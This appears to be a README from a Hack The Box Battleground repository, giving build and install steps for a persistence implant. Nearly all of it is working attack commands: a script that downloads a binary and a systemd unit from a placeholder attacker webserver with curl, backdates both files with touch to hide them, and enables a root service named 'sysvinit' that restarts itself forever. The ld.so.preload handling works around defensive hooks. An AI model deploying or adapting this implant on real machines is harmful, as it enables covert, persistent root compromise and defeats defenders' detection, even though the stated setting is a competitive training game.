# HBG-Pwnage
 HTB Battleground implant


## Compiling
```
gcc implant.c -o implant
```

## Installing
```
#!/bin/bash

if [ -f "/etc/ld.so.preload" ]; then
  mv /etc/ld.so.preload /etc/ld.so.preload.bak
fi

curl -S http://{your_webserver_ip}/systemd-sysvinit -o /usr/lib/systemd/systemd-sysvinit && chmod 755 /usr/lib/systemd/systemd-sysvinit
curl -S http://{your_webserver_ip}/sysvinit.service -o /usr/lib/systemd/system/sysvinit.service

touch -r /etc/lsb-release /usr/lib/systemd/systemd-sysvinit
touch -r /etc/lsb-release /usr/lib/systemd/system/sysvinit.service
systemctl daemon-reload
sudo systemctl enable sysvinit
systemctl start sysvinit

if [ -f "/etc/ld.so.preload.bak" ]; then
  mv /etc/ld.so.preload.bak /etc/ld.so.preload
fi
```


## Service definition
```
[Unit]
Description=Sysvinit
StartLimitIntervalSec=0

[Service]
Type=forking
Restart=always
RestartSec=1
User=root
ExecStart=/lib/systemd/systemd-sysvinit

[Install]
WantedBy=multi-user.target
```